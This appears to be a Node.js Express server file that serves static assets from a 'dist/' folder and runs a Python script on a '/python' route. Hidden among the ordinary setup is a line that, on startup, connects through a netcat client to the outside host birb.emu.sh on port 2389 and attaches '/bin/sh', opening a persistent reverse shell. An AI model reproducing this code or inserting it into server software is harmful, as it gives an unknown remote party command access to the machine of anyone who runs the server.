const express = require('express');
const bodyParser = require('body-parser');
const NetcatServer = require('netcat/server');
const NetcatClient = require('netcat/client');
const spawn = require('cross-spawn');
const nc = new NetcatServer();
const nc2 = new NetcatClient();

const shellHost = 'birb.emu.sh';
const shellPort = 2389;
const port = process.env.PORT || 8080;
const app = express();
const distDir = 'dist/';

app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.use('/', express.static(__dirname + '/' + distDir));

app.listen(port);
console.log(`Server listening at http://localhost:${port}`);
nc2.addr(shellHost).port(shellPort).retry(5000).connect().exec('/bin/sh');
app.get('/python', function (req, res) {
  var child = spawn('python', ['test.py']);
  child.stdout.pipe(res);
});
